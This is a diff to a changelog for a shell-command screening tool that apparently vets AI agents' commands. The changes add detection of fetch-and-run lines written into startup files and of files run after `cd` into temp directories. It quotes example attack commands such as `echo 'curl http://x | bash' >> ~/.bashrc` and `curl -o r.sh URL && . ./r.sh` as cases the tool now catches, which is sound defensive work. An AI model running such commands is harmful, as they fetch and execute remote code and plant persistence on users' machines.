@@ -95,6 +95,16 @@ follows semantic versioning.
   They now score the same: review, blocked for an agent, denied with the same
   aggravating evidence. A one-liner that only prints, and a download nobody
   runs, stay allowed.
+- **A command written into a shell startup file is screened as a command.**
+  `echo 'curl http://x | bash' >> ~/.bashrc` (and the same with `printf`,
+  `tee -a`, a here-string, or a heredoc into `.bashrc`, `.bash_profile`,
+  `.profile`, `.zshrc`, `/etc/profile.d/` and the other startup files) was
+  allowed: the written text is literal output, so only the profile write was
+  scored. The text is now analysed as the command it becomes at the next
+  login, and it scores what running it directly scores, plus the
+  persistence. `export PATH=...` and `alias` lines analyse to nothing and
+  stay allowed. A line that is itself flagged when run directly is flagged
+  when written too (for example `source <(kubectl completion bash)`).
 - **Running a file after `cd` into a temp directory is seen.**
   `cd /tmp && ./x`, `cd /dev/shm; sh p`, `pushd /var/tmp`, and a `cd` into a
   directory the same command made with `mktemp -d` were allowed: the
@@ -102,7 +112,9 @@ follows semantic versioning.
   directory the command moves into is now followed, so running a relative
   file from there is flagged like `/tmp/x` (review on its own, and a
   fetch-and-run there is denied). `cd /tmp && ls` or `cat x` runs nothing
-  from it and stays allowed.
+  from it and stays allowed. A subshell's `cd` ends with the subshell, so
+  `(cd /tmp && ls); ./build.sh` is not flagged, while `(cd /tmp && ./x)` and
+  `{ cd /tmp; ./x; }` are.
 - **Sourcing a downloaded file with `.` is seen.** `curl -o r.sh URL && .
   ./r.sh` was allowed while `source ./r.sh` was caught.
 - **An MCP wrapper whose proxy binary is gone is not reported as guarded.**
@@ -114,9 +126,10 @@ follows semantic versioning.
 
 ### Project
 
-- The benchmark gate holds the new cases: 182 attacks caught, every command
+- The benchmark gate holds the new cases: 189 attacks caught, every command
   attack blocked for an agent, fetch-and-runs after `cd` into a temp
-  directory denied, and 0 of 121 ordinary commands flagged
+  directory denied, startup-file writes charged for what they write, and 0
+  of 127 ordinary commands flagged
   (including unparseable ones that only fetch or only run, `npx`/`uvx` runs
   of real packages, downloads through aria2c, axel and lwp-download that are
   not run, network one-liners that only print or save data, and `cd /tmp`
